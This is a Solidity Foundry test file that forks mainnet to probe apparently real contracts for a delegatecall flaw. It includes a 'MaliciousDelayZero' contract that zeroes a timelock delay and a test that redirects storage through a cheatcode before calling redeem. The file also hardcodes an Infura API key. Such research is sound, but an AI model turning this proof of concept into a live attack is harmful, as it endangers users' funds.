// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract RCDelegatecallAnalysis is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_FindRCTargetInR0() public {
        console.log("=== FIND RC TARGET IN R0 ===\n");

        bytes memory r0Code = R0.code;
        bytes20 rcBytes = bytes20(RC);

        console.log("R0 code length:", r0Code.length);
        console.log("Searching for RC address in R0 bytecode...");

        for (uint i = 0; i < r0Code.length - 20; i++) {
            bool found = true;
            for (uint j = 0; j < 20; j++) {
                if (r0Code[i + j] != rcBytes[j]) {
                    found = false;
                    break;
                }
            }
            if (found) {
                console.log("RC address found at bytecode offset:", i);
            }
        }

        // Check storage slots
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(R0, bytes32(i));
            address addr = address(uint160(uint256(slot)));
            if (addr == RC) {
                console.log("RC found in R0 slot:", i);
            }
        }
    }

    function test_ExploitSlot5Modification() public {
        console.log("=== EXPLOIT SLOT 5 MODIFICATION ===\n");

        MaliciousDelayZero delayZero = new MaliciousDelayZero();
        console.log("Malicious contract:", address(delayZero));

        bytes32 slot4Before = vm.load(R0, bytes32(uint256(4)));
        uint256 delayBefore = (uint256(slot4Before) >> 96) & type(uint32).max;
        console.log("Delay before:", delayBefore / 86400, "days");

        // Modify R0 slot 5 (mapping base, but RC reads it as IAU)
        vm.store(R0, bytes32(uint256(5)), bytes32(uint256(uint160(address(delayZero)))));

        deal(TASSET, attacker, 10000e18);
        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Trigger potential delegatecall
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        vm.stopPrank();

        bytes32 slot4After = vm.load(R0, bytes32(uint256(4)));
        uint256 delayAfter = (uint256(slot4After) >> 96) & type(uint32).max;
        console.log("Delay after:", delayAfter / 86400, "days");

        if (delayAfter < delayBefore) {
            console.log("*** DELAY MODIFIED VIA DELEGATECALL! ***");
        }
    }

    function test_TraceR0DelegatecallOffsets() public view {
        console.log("=== R0 DELEGATECALL ANALYSIS ===\n");

        bytes memory r0Code = R0.code;
        console.log("R0 code length:", r0Code.length);

        console.log("Searching for DELEGATECALL (0xF4)...");
        for (uint i = 0; i < r0Code.length; i++) {
            if (uint8(r0Code[i]) == 0xF4) {
                console.log("DELEGATECALL at offset:", i);
            }
        }
    }
}

contract MaliciousDelayZero {
    fallback() external {
        assembly {
            let slot4 := sload(4)
            let mask := not(shl(96, 0xFFFFFFFF))
            slot4 := and(slot4, mask)
            sstore(4, slot4)
        }
    }
}
